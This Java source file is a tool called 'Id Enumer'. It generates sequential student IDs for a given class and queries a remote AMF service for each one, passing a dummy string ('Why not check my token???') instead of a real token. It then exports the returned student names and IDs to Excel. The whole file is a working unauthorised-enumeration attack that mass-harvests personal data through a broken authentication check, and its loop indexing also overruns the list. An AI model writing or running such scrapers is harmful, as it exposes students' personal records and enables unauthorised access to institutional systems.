import com.weedong.flex.client.AMFConnection;
import com.weedong.flex.client.ClientStatusException;
import com.weedong.flex.client.ServerStatusException;
import com.weedong.flex.messaging.io.ASObject;
import sn.zhang.amfparser.utils.ExcelUtils;
import sn.zhang.amfparser.utils.Tools;
import sn.zhang.amfparser.utils.values;

import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class Main {

    public static void main(String[] args) {
        values values = new values();
        Tools tools = new Tools();
        Scanner scanner = new Scanner(System.in);
        System.out.println("This is a xls-exporter version of Enumer.");
        System.out.println("Id Enumer Running!");
        System.out.println("By ZhangJun");
        System.out.println("Kernel Version:" + values.kernelVersion);
        System.out.println("Shell Version:" + values.shellVersion);
        System.out.println();
        String prefix = "218", subfix = "1", total, class_id;
        System.out.print("Enter Class:");
        class_id = scanner.nextLine();
        prefix = "218" + class_id + "1";
        //System.out.print("Enter Total:");
        //total = scanner.nextLine();
        ArrayList al = new ArrayList(60);
        al.addAll(tools.createListByClass(prefix));
        System.out.println();
        for (int i = 1; i < al.size() + 1; i++) {
            AMFConnection amfConnection = new AMFConnection();
            try {
                amfConnection.connect(values.url);
                Object result = amfConnection.call(values.command, 19868, al.get(i), "Why not check my token???");
                ASObject asObject = (ASObject) result;
                java.util.ArrayList rootMap = (java.util.ArrayList) asObject.get("source");
                values.studentID = al.get(i).toString();
                if (rootMap.size() == 0) {
                    break;
                }
                tools.query(rootMap, asObject, values);
                String tmp[] = {values.studentName, values.studentID};
                values.sheet.add(tmp);
            } catch (ClientStatusException e) {
                e.printStackTrace();
            } catch (ServerStatusException e) {
                e.printStackTrace();
            } finally {
                amfConnection.close();
            }
        }
        String export = "姓名#name,学号#id";
        String[] excelHeader = export.split(",");
        try {
            ExcelUtils.export(excelHeader, values.sheet);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

